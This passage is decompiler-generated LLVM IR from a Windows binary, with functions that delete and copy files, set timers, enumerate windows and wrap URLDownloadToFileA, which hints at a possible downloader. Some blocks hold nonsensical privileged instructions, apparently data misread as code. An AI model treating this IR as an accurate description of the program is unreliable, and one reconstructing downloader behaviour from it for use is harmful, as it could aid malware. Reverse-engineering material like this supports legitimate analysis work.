dec_label_pc_405c6b:                              ; preds = %dec_label_pc_405c01
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1111
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1111
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1112
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1112
  br label %dec_label_pc_405c7a, !insn.addr !1112

dec_label_pc_405c7a:                              ; preds = %dec_label_pc_405c6b, %dec_label_pc_405c01, %dec_label_pc_405bf9, %dec_label_pc_405bce, %dec_label_pc_405ba5, %dec_label_pc_405b8a, %dec_label_pc_405b70
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1113
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1113
  %51 = load i32, i32* %50, align 4, !insn.addr !1113
  ret i32 %51, !insn.addr !1114
}

define i32 @function_405c85(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_405c85:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1115
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1115
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1115
  store i8 %6, i8* %7, align 1, !insn.addr !1115
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1116
  %10 = udiv i32 %4, 256, !insn.addr !1116
  %11 = trunc i32 %10 to i8, !insn.addr !1116
  %12 = add i8 %9, %11, !insn.addr !1116
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1116
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1116
  store i8 %12, i8* %14, align 1, !insn.addr !1116
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1117
  %17 = add i32 %4, 6, !insn.addr !1117
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1117
  %19 = zext i1 %16 to i32, !insn.addr !1117
  %20 = and i32 %4, -65536, !insn.addr !1117
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1118
  %23 = or i1 %16, %22, !insn.addr !1118
  %24 = add i32 %18, 6, !insn.addr !1118
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1118
  %26 = zext i1 %23 to i32, !insn.addr !1118
  %27 = and i32 %25, 15, !insn.addr !1118
  %28 = or i32 %27, %20, !insn.addr !1118
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1118
  %31 = or i32 %28, %30, !insn.addr !1118
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1119
  %33 = load i8, i8* %32, align 1, !insn.addr !1119
  %34 = trunc i32 %27 to i8, !insn.addr !1119
  %35 = xor i8 %33, %34, !insn.addr !1119
  store i8 %35, i8* %32, align 1, !insn.addr !1119
  %36 = add i32 %0, 1311123697, !insn.addr !1120
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1120
  %38 = load i8, i8* %37, align 1, !insn.addr !1120
  %39 = udiv i32 %3, 256, !insn.addr !1120
  %40 = trunc i32 %39 to i8, !insn.addr !1120
  %41 = add i8 %38, %40, !insn.addr !1120
  store i8 %41, i8* %37, align 1, !insn.addr !1120
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1121
  %43 = load i32, i32* %42, align 4, !insn.addr !1121
  %44 = sub i32 %43, %31, !insn.addr !1121
  store i32 %44, i32* %42, align 4, !insn.addr !1121
  %45 = add i32 %3, 117, !insn.addr !1122
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1122
  %47 = load i8, i8* %46, align 1, !insn.addr !1122
  %48 = add i8 %47, %34, !insn.addr !1122
  %49 = icmp eq i8 %48, 0, !insn.addr !1122
  store i8 %48, i8* %46, align 1, !insn.addr !1122
  br i1 %49, label %dec_label_pc_405d10, label %dec_label_pc_405c9c, !insn.addr !1123

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c85
  %50 = xor i32 %3, %1, !insn.addr !1124
  %51 = trunc i32 %3 to i16, !insn.addr !1125
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1125
  %53 = load i32, i32* %52, align 4, !insn.addr !1125
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1125
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1126
  %55 = load i8, i8* %54, align 1, !insn.addr !1126
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1126
  %56 = load i8, i8* %32, align 1, !insn.addr !1127
  %57 = add i8 %56, %34, !insn.addr !1127
  store i8 %57, i8* %32, align 1, !insn.addr !1127
  %58 = call i32 @__asm_iretd(), !insn.addr !1128
  %59 = add i32 %2, -117, !insn.addr !1129
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1129
  %61 = load i8, i8* %60, align 1, !insn.addr !1129
  %62 = add i8 %61, -69, !insn.addr !1129
  store i8 %62, i8* %60, align 1, !insn.addr !1129
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1130
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1131
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1131
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1131
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1132
  %66 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1133
  %67 = add i32 %66, 1, !insn.addr !1133
  store i32 %67, i32* @global_var_4096bc, align 4, !insn.addr !1133
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1134
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1135
  ret i32 0, !insn.addr !1136

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405c85
  %69 = call i32 @function_403c90(), !insn.addr !1137
  store i32 %69, i32* %ebx, align 4, !insn.addr !1138
  %70 = icmp slt i32 %69, 0, !insn.addr !1139
  br i1 %70, label %dec_label_pc_405d38, label %dec_label_pc_405d20, !insn.addr !1140

dec_label_pc_405d20:                              ; preds = %dec_label_pc_405d10
  %71 = add i32 %69, 1, !insn.addr !1141
  store i32 %71, i32* %ebx, align 4, !insn.addr !1141
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1142
  br label %dec_label_pc_405d79

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d10
  %73 = call i32 @function_403c88(), !insn.addr !1143
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1144
  %75 = call i32 @function_403c90(), !insn.addr !1145
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1146
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1147
  br label %dec_label_pc_405d79, !insn.addr !1147

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d20, %dec_label_pc_405d38
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1148
}

define i32 @function_405d80() local_unnamed_addr {
dec_label_pc_405d80:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1149
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1149
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1149
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1150
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1151
  %3 = add i32 %2, 1, !insn.addr !1151
  %4 = icmp eq i32 %3, 0, !insn.addr !1151
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1151
  %5 = icmp eq i1 %4, false, !insn.addr !1152
  br i1 %5, label %dec_label_pc_405da9, label %dec_label_pc_405d99, !insn.addr !1152

dec_label_pc_405d99:                              ; preds = %dec_label_pc_405d80
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1153
  br label %dec_label_pc_405da9, !insn.addr !1153

dec_label_pc_405da9:                              ; preds = %dec_label_pc_405d99, %dec_label_pc_405d80
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1154
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1155
  ret i32 0, !insn.addr !1156
}

define i32 @function_405db7() local_unnamed_addr {
dec_label_pc_405db7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1157
  ret i32 %0, !insn.addr !1157
}

define i32 @function_405dbc() local_unnamed_addr {
dec_label_pc_405dbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1158
}

define i32 @function_405dbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dbe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1159
}

define i32 @function_405dc0() local_unnamed_addr {
dec_label_pc_405dc0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1160
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1160
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1160
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1161
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1162
  %3 = add i32 %2, -1, !insn.addr !1162
  %4 = icmp eq i32 %2, 0, !insn.addr !1162
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1162
  %5 = icmp eq i1 %4, false, !insn.addr !1163
  br i1 %5, label %dec_label_pc_405df4, label %dec_label_pc_405dda, !insn.addr !1163

dec_label_pc_405dda:                              ; preds = %dec_label_pc_405dc0
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1164
  br label %dec_label_pc_405df4, !insn.addr !1165

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dda, %dec_label_pc_405dc0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1166
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1167
  ret i32 0, !insn.addr !1168
}

define i32 @function_405e02() local_unnamed_addr {
dec_label_pc_405e02:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1169
  ret i32 %0, !insn.addr !1169
}

define i32 @function_405e07() local_unnamed_addr {
dec_label_pc_405e07:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1170
}

define i32 @function_405e09(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e09:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1171
}

define i32 @function_405e0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1172
}

define i32 @function_405e0f(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0f:
  %esp.0.reg2mem = alloca i32, !insn.addr !1173
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call x86_fp80 @__decompiler_undefined_function_9()
  %6 = call i1 @__decompiler_undefined_function_1()
  %7 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  call void @__asm_out(i32 177, i32 %4), !insn.addr !1173
  %8 = and i32 %0, 255, !insn.addr !1174
  %9 = add i32 %2, %8, !insn.addr !1174
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1174
  %11 = load i8, i8* %10, align 1, !insn.addr !1174
  %12 = and i32 %0, -256, !insn.addr !1174
  %13 = fptosi x86_fp80 %5 to i64, !insn.addr !1175
  %14 = add i32 %3, 785765858, !insn.addr !1175
  %15 = inttoptr i32 %14 to i64*, !insn.addr !1175
  store i64 %13, i64* %15, align 4, !insn.addr !1175
  br i1 %6, label %dec_label_pc_405e84, label %dec_label_pc_405e1b, !insn.addr !1176

dec_label_pc_405e1b:                              ; preds = %dec_label_pc_405e0f
  %16 = zext i8 %11 to i32, !insn.addr !1174
  %17 = or i32 %12, %16, !insn.addr !1174
  %18 = inttoptr i32 %17 to i8*, !insn.addr !1177
  %19 = load i8, i8* %18, align 1, !insn.addr !1177
  %factor = mul i8 %11, 26
  %20 = add i8 %19, %factor, !insn.addr !1178
  store i8 %20, i8* %18, align 1, !insn.addr !1178
  store i8* null, i8** %stack_var_-20, align 4, !insn.addr !1179
  %21 = call i32 @__readfsdword(i32 0), !insn.addr !1180
  store i32 %21, i32* %stack_var_-48, align 4, !insn.addr !1180
  %22 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1180
  call void @__writefsdword(i32 0, i32 %22), !insn.addr !1181
  %23 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1182
  ret i32 %23, !insn.addr !1183

dec_label_pc_405e84:                              ; preds = %dec_label_pc_405e0f
  %24 = select i1 %7, i32 -4, i32 4, !insn.addr !1184
  %25 = add i32 %24, %0, !insn.addr !1184
  %26 = inttoptr i32 %25 to i8*, !insn.addr !1185
  %27 = load i8, i8* %26, align 1, !insn.addr !1185
  %28 = zext i8 %27 to i32, !insn.addr !1185
  %29 = or i32 %12, %28, !insn.addr !1185
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1186
  %31 = load i8, i8* %30, align 1, !insn.addr !1186
  %32 = add i8 %31, %27, !insn.addr !1186
  store i8 %32, i8* %30, align 1, !insn.addr !1186
  %33 = add i32 %1, -963905451, !insn.addr !1187
  %34 = inttoptr i32 %33 to i8*, !insn.addr !1187
  %35 = load i8, i8* %34, align 1, !insn.addr !1187
  %36 = trunc i32 %3 to i8, !insn.addr !1187
  %37 = add i8 %35, %36, !insn.addr !1187
  store i8 %37, i8* %34, align 1, !insn.addr !1187
  %38 = call i32 @function_406f9c(), !insn.addr !1188
  %39 = call i32 @"@LStrPos"(), !insn.addr !1189
  %40 = call i32 @"@LStrPos"(), !insn.addr !1190
  %41 = add i32 %40, -1, !insn.addr !1191
  %42 = icmp slt i32 %41, 0, !insn.addr !1192
  %43 = add i32 %39, 2, !insn.addr !1193
  %44 = icmp sgt i32 %43, %41, !insn.addr !1194
  %or.cond = or i1 %42, %44
  br i1 %or.cond, label %dec_label_pc_405f34, label %dec_label_pc_405ebc, !insn.addr !1195

dec_label_pc_405ebc:                              ; preds = %dec_label_pc_405e84
  %45 = add i32 %1, -12, !insn.addr !1196
  store i32 %45, i32* %stack_var_-4, align 4, !insn.addr !1197
  %46 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1197
  %47 = call i32 @"@LStrCopy"(), !insn.addr !1198
  %48 = inttoptr i32 %45 to i32*, !insn.addr !1199
  %49 = load i32, i32* %48, align 4, !insn.addr !1199
  %50 = icmp eq i32 %49, 0, !insn.addr !1199
  store i32 %46, i32* %esp.0.reg2mem, !insn.addr !1200
  br i1 %50, label %dec_label_pc_405f34, label %dec_label_pc_405ee4, !insn.addr !1200

dec_label_pc_405ee4:                              ; preds = %dec_label_pc_405ebc
  %51 = call i32 @function_406d84(), !insn.addr !1201
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1202
  %53 = call i32 @"@LStrCat"(), !insn.addr !1203
  %54 = call i32 @function_4036c8(), !insn.addr !1204
  %55 = inttoptr i32 %54 to i8*, !insn.addr !1205
  %56 = call i1 @DeleteFileA(i8* %55), !insn.addr !1206
  %57 = call i32 @function_4036c8(), !insn.addr !1207
  %58 = inttoptr i32 %57 to i8*, !insn.addr !1208
  store i8* %58, i8** %stack_var_-20, align 4, !insn.addr !1208
  %59 = ptrtoint i8** %stack_var_-20 to i32, !insn.addr !1208
  %60 = call i1 @CopyFileA(i8* %58, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1209
  %61 = call i32 @function_405b70(), !insn.addr !1210
  store i32 %59, i32* %esp.0.reg2mem, !insn.addr !1210
  br label %dec_label_pc_405f34, !insn.addr !1210

dec_label_pc_405f34:                              ; preds = %dec_label_pc_405ee4, %dec_label_pc_405ebc, %dec_label_pc_405e84
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %62 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1211
  %63 = load i32, i32* %62, align 4, !insn.addr !1211
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !1212
  %64 = add i32 %esp.0.reload, 8, !insn.addr !1213
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1213
  store i32 4218710, i32* %65, align 4, !insn.addr !1213
  %66 = call i32 @"@LStrArrayClr"(), !insn.addr !1214
  ret i32 %66, !insn.addr !1215
}

define i32 @function_405f4f() local_unnamed_addr {
dec_label_pc_405f4f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1216
  ret i32 %0, !insn.addr !1216
}

define i32 @function_405f54() local_unnamed_addr {
dec_label_pc_405f54:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1217
}

define i32 @function_405f56(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405f56:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1218
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1218
  %3 = load i32, i32* %2, align 4, !insn.addr !1218
  ret i32 %3, !insn.addr !1219
}

define i32 @function_405f67() local_unnamed_addr {
dec_label_pc_405f67:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1220
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1220
  store i32 %1, i32* %2, align 4, !insn.addr !1220
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1221
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1221
  %7 = add i8 %4, %6, !insn.addr !1221
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1221
  store i8 %7, i8* %8, align 1, !insn.addr !1221
  %9 = load i32, i32* %eax, align 4, !insn.addr !1222
  ret i32 %9, !insn.addr !1222
}

define i32 @function_405f76() local_unnamed_addr {
dec_label_pc_405f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1223
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1223
  store i8 %4, i8* %5, align 1, !insn.addr !1223
  %6 = mul i32 %0, 4096, !insn.addr !1224
  %7 = udiv i32 %0, 1048576, !insn.addr !1224
  %8 = or i32 %7, %6, !insn.addr !1224
  %9 = and i32 %0, 1048576, !insn.addr !1224
  %10 = icmp eq i32 %9, 0, !insn.addr !1224
  %11 = load i32, i32* %edx, align 4, !insn.addr !1225
  %12 = trunc i32 %11 to i16, !insn.addr !1225
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1225
  %14 = sext i8 %13 to i32, !insn.addr !1225
  %15 = or i32 %2, %14, !insn.addr !1225
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1226
  %17 = and i32 %15, -256, !insn.addr !1226
  %18 = or i32 %17, %16, !insn.addr !1226
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1227
  %20 = load i8, i8* %19, align 1, !insn.addr !1227
  %21 = mul i8 %20, 2, !insn.addr !1227
  %22 = lshr i8 %20, 7, !insn.addr !1227
  %23 = or i8 %22, %21, !insn.addr !1227
  store i8 %23, i8* %19, align 1, !insn.addr !1227
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1228
  %26 = udiv i32 %1, 256, !insn.addr !1228
  %27 = trunc i32 %26 to i8, !insn.addr !1228
  %28 = add i8 %25, %27, !insn.addr !1228
  %29 = load i32, i32* %edx, align 4, !insn.addr !1228
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1228
  store i8 %28, i8* %30, align 1, !insn.addr !1228
  %31 = add i32 %8, -4, !insn.addr !1229
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1229
  store i32 4218448, i32* %32, align 4, !insn.addr !1229
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1230
  %34 = sext i1 %33 to i32, !insn.addr !1230
  ret i32 %34, !insn.addr !1231
}

define i32 @function_405f80(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_405f90() local_unnamed_addr {
dec_label_pc_405f90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1232
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1232
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1232
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1233
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1234
  %3 = add i32 %2, 1, !insn.addr !1234
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1234
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1235
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1236
  ret i32 0, !insn.addr !1237
}

define i32 @function_405fb5() local_unnamed_addr {
dec_label_pc_405fb5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1238
  ret i32 %0, !insn.addr !1238
}

define i32 @function_405fba() local_unnamed_addr {
dec_label_pc_405fba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1239
}

define i32 @function_405fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1240
}

define i32 @function_405fc0() local_unnamed_addr {
dec_label_pc_405fc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1241
  %2 = add i32 %1, -1, !insn.addr !1241
  store i32 %2, i32* @global_var_4096c8, align 4, !insn.addr !1241
  ret i32 %0, !insn.addr !1242
}

define i32 @function_405fc8() local_unnamed_addr {
dec_label_pc_405fc8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1243
  %0 = call i32 @function_40603c(), !insn.addr !1244
  %1 = load i32, i32* @global_var_40812c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1245
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1246
  br i1 %2, label %dec_label_pc_405ffc, label %dec_label_pc_405fda, !insn.addr !1246

dec_label_pc_405fda:                              ; preds = %dec_label_pc_405fc8
  %3 = load i32, i32* inttoptr (i32 4227412 to i32*), align 4, !insn.addr !1247
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1248
  %5 = load i32, i32* %4, align 4, !insn.addr !1248
  %6 = icmp eq i32 %5, 0, !insn.addr !1248
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1249
  br i1 %6, label %dec_label_pc_405ffc, label %dec_label_pc_405fe4, !insn.addr !1249

dec_label_pc_405fe4:                              ; preds = %dec_label_pc_405fda
  call void @PostQuitMessage(i32 66), !insn.addr !1250
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1251
  unreachable, !insn.addr !1251

dec_label_pc_405ffc:                              ; preds = %dec_label_pc_405fda, %dec_label_pc_405fc8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1252
}

define i32 @function_40600c() local_unnamed_addr {
dec_label_pc_40600c:
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1253
  %1 = icmp eq i32 %0, 0, !insn.addr !1253
  br i1 %1, label %dec_label_pc_40601a, label %dec_label_pc_406015, !insn.addr !1254

dec_label_pc_406015:                              ; preds = %dec_label_pc_40600c
  %2 = call i32 @function_40603c(), !insn.addr !1255
  br label %dec_label_pc_40601a, !insn.addr !1255

dec_label_pc_40601a:                              ; preds = %dec_label_pc_406015, %dec_label_pc_40600c
  %3 = load i32, i32* inttoptr (i32 4227400 to i32*), align 8, !insn.addr !1256
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1257
  %5 = load i32, i32* %4, align 4, !insn.addr !1257
  %6 = mul i32 %5, 1000, !insn.addr !1257
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4218824 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1258
  store i32 %7, i32* @global_var_408104, align 4, !insn.addr !1259
  ret i32 %7, !insn.addr !1260
}

define i32 @function_40603c() local_unnamed_addr {
dec_label_pc_40603c:
  %.reg2mem = alloca i32, !insn.addr !1261
  %0 = load i32, i32* @global_var_408104, align 4, !insn.addr !1261
  %1 = icmp eq i32 %0, 0, !insn.addr !1261
  store i32 %0, i32* %.reg2mem, !insn.addr !1262
  br i1 %1, label %2, label %dec_label_pc_406045, !insn.addr !1262

; <label>:2:                                      ; preds = %dec_label_pc_40603c
  %3 = call i32 @function_406059(), !insn.addr !1262
  %.pre = load i32, i32* @global_var_408104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1262
  br label %dec_label_pc_406045, !insn.addr !1262

dec_label_pc_406045:                              ; preds = %2, %dec_label_pc_40603c
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1263
  ret i32 %.reload, !insn.addr !1264
}

define i32 @function_406059() local_unnamed_addr {
dec_label_pc_406059:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1265
}

define i32 @function_40605c() local_unnamed_addr {
dec_label_pc_40605c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_405f80(i32 %0), !insn.addr !1266
  ret i32 %1, !insn.addr !1267
}

define i32 @function_406068() local_unnamed_addr {
dec_label_pc_406068:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1268
  %1 = icmp eq i32 %0, 0, !insn.addr !1268
  br i1 %1, label %dec_label_pc_406076, label %dec_label_pc_406071, !insn.addr !1269

dec_label_pc_406071:                              ; preds = %dec_label_pc_406068
  %2 = call i32 @function_406090(), !insn.addr !1270
  br label %dec_label_pc_406076, !insn.addr !1270

dec_label_pc_406076:                              ; preds = %dec_label_pc_406071, %dec_label_pc_406068
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4218972 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1271
  store i32 %3, i32* @global_var_408108, align 4, !insn.addr !1272
  ret i32 %3, !insn.addr !1273
}

define i32 @function_406090() local_unnamed_addr {
dec_label_pc_406090:
  %0 = load i32, i32* @global_var_408108, align 4, !insn.addr !1274
  ret i32 %0, !insn.addr !1275
}

define i32 @function_4060b0() local_unnamed_addr {
dec_label_pc_4060b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1276
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1276
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1276
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1277
  %2 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1278
  %3 = add i32 %2, 1, !insn.addr !1278
  store i32 %3, i32* @global_var_4096cc, align 4, !insn.addr !1278
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1279
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1280
  ret i32 0, !insn.addr !1281
}

define i32 @function_4060d5() local_unnamed_addr {
dec_label_pc_4060d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1282
  ret i32 %0, !insn.addr !1282
}

define i32 @function_4060da() local_unnamed_addr {
dec_label_pc_4060da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1283
}

define i32 @function_4060dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1284
}

define i32 @function_4060e0() local_unnamed_addr {
dec_label_pc_4060e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096cc, align 4, !insn.addr !1285
  %2 = add i32 %1, -1, !insn.addr !1285
  store i32 %2, i32* @global_var_4096cc, align 4, !insn.addr !1285
  ret i32 %0, !insn.addr !1286
}

define i32 @function_4060e8() local_unnamed_addr {
dec_label_pc_4060e8:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1287
  ret i32 %0, !insn.addr !1287
}

define i32 @function_4060f0() local_unnamed_addr {
dec_label_pc_4060f0:
  %esi.0.reg2mem = alloca i32, !insn.addr !1288
  %ebx.0.reg2mem = alloca i32, !insn.addr !1288
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1289
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1290
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1290
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1290
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1291
  %4 = call i32 @function_4034c8(), !insn.addr !1292
